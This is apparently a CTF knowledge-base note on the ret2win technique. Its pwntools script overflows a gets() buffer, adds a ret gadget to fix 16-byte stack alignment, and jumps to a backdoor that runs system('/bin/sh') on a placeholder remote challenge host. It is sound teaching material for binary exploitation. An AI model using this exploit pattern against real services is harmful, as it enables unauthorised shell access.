---
title: ret2win — 栈溢出跳转后门
category: pwn
tags: [stack-overflow, ret2win, gets, stack-alignment, system]
triggers: [ret2win, gets, backdoor, stack overflow, movaps, 16字节对齐, 栈对齐, ret gadget, /bin/sh]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/pwn/PWN-Authenticate_ret2win.md]
---

## Summary

`gets()` 无界读取覆盖返回地址，跳转 backdoor 函数执行 `system("/bin/sh")`。关键注意栈对齐（movaps 指令需要 16 字节对齐）。

## Key Points

- checksec 四保护全关时优先检查 backdoor 函数
- ret2win 是最简单的栈溢出利用模式
- system() 中 movaps 需要 16 字节对齐，需插入 ret gadget

## Details

### 核心代码

```python
from pwn import *
BACKDOOR = 0x4011f6       # system("/bin/sh") 后门
RET = 0x40101a            # ret gadget（栈对齐）
OFFSET = 0x88             # buffer(rbp-0x80) + saved_rbp(8)

io = remote('host', port)
io.sendlineafter(b'Username: ', b'test')
io.sendlineafter(b'Password: ', b'A' * OFFSET + p64(RET) + p64(BACKDOOR))
io.sendline(b'cat flag*')
```

### 栈对齐原理

x86-64 ABI 要求 call 前 RSP 必须 16 字节对齐。ret gadget = 多一次 pop 使 RSP += 8。
